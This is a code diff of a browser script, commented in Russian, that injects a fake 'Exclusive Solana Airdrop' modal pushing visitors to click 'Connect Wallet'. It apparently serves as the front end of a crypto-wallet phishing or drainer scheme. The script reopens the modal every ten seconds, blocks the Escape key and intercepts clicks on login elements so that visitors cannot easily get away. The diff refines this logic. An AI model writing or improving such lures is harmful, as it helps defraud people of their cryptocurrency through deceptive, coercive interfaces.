@@ -1,12 +1,10 @@
 window.addEventListener('load', function () {
-  // 1. Конфигурация
   const config = {
     modalZIndex: 9998,
     showDelay: 500,
     reopenInterval: 10000 // каждые 10 секунд
   };
 
-  // 2. Языковые настройки
   const isRussian = (navigator.language || navigator.userLanguage).includes('ru');
   const lang = isRussian ? {
     title: "🚀 Эксклюзивный Airdrop в сети Solana!",
@@ -20,7 +18,6 @@ window.addEventListener('load', function () {
     button: "Connect Wallet"
   };
 
-  // 3. Создаем модальное окно
   const modal = document.createElement('div');
   modal.id = 'sol-airdrop-modal';
   Object.assign(modal.style, {
@@ -87,48 +84,48 @@ window.addEventListener('load', function () {
 
   document.body.appendChild(modal);
 
-  // 4. Управление видимостью
-  let userClosed = false; // флаг, что пользователь закрыл окно вручную
+  let userClosed = false; // true — закрыл вручную
 
   const showModal = () => {
     if (window.walletConnected) return;
     modal.style.opacity = '1';
     modal.style.pointerEvents = 'auto';
-    userClosed = false;
   };
 
   const hideModal = () => {
     modal.style.opacity = '0';
     modal.style.pointerEvents = 'none';
-    userClosed = true;
+    userClosed = true; // запоминаем, что закрыл вручную
   };
 
-  // 5. Показ после полной загрузки + задержка
+  // Показ через задержку после полной загрузки
   setTimeout(showModal, config.showDelay);
 
-  // 6. Кнопка подключения
+  // Кнопка подключения — закрывает модалку
   modal.querySelector('#airdrop-connect-btn').addEventListener('click', () => {
     hideModal();
     if (typeof window.startConnect === 'function') window.startConnect();
   });
 
-  // 7. Клик по .goAuth — всегда открывает снова
+  // Клик по .goAuth — всегда открывает
   document.addEventListener('click', function (e) {
     const goAuthElement = e.target.closest('.goAuth');
     if (goAuthElement && !window.walletConnected) {
       e.preventDefault();
       showModal();
+      userClosed = false; // если открыли сами — сбрасываем флаг
     }
   }, true);
 
-  // 8. Автоповтор показа каждые 10 секунд, если закрыто и нет кошелька
+  // Автоповтор показа каждые 10 секунд, только если закрыл вручную
   setInterval(() => {
     if (!window.walletConnected && userClosed) {
       showModal();
+      userClosed = false; // сбрасываем, чтобы снова не спамить
     }
   }, config.reopenInterval);
 
-  // 9. Запрет закрытия через Escape
+  // Запрет закрытия через Escape
   window.addEventListener('keydown', function (e) {
     if (e.key === 'Escape') e.preventDefault();
   });
